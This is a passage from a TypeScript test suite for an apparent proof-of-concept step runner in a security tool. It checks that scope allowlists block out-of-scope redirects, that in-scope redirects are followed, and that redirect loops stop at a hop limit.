        kind: "exploit",
        summary: "cross",
        action: { type: "http", method: "GET", url: "http://api.acme.com/step" },
      },
    ]);
    const report = await executePocSteps(finding, {
      scopeAllowlist: ["api.acme.com"],
      rpsPerHost: 100,
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("redirect to out-of-scope host");
    expect(calls).toHaveLength(1);
  });

  it("redirect: same-scope redirect is allowed and evaluated", async () => {
    let callIndex = 0;
    const { fetchFn, calls } = makeFakeFetch(() => {
      callIndex++;
      if (callIndex === 1) {
        return new Response("", { status: 302, headers: { location: "/final" } });
      }
      return new Response("inside scope", { status: 200 });
    });
    restore = setRuntimeDeps({ fetch: fetchFn });

    const finding = findingWith([
      {
        id: "same-scope",
        kind: "exploit",
        summary: "follow redirect",
        action: { type: "http", method: "GET", url: "http://api.acme.com/start" },
        expect: { type: "body-contains", text: "inside scope" },
      },
    ]);
    const report = await executePocSteps(finding, {
      baseUrl: "http://api.acme.com",
      scopeAllowlist: ["api.acme.com"],
      rpsPerHost: 100,
    });
    expect(report.steps[0].kind).toBe("passed");
    expect(report.steps[0].observedResponseBody).toBe("inside scope");
    // Two fetches: initial redirect response + the followed location.
    expect(calls).toHaveLength(2);
  });

  it("redirect: loop exceeds MAX_REDIRECT_HOPS and errors", async () => {
    const { fetchFn, calls } = makeFakeFetch(() =>
      new Response("", { status: 302, headers: { location: "/loop" } }),
    );
    restore = setRuntimeDeps({ fetch: fetchFn });

    const finding = findingWith([
      {
        id: "redirect-loop",
        kind: "exploit",
        summary: "loop",
        action: { type: "http", method: "GET", url: "http://api.acme.com/start" },
      },
    ]);
    const report = await executePocSteps(finding, {
      baseUrl: "http://api.acme.com",
      scopeAllowlist: ["api.acme.com"],
      rpsPerHost: 100,
    });
    expect(report.steps[0].kind).toBe("errored");
    expect(report.steps[0].error).toContain("too many redirects");
    // 1 initial + 5 redirect hops = 6 fetches
    expect(calls).toHaveLength(6);
  });
});
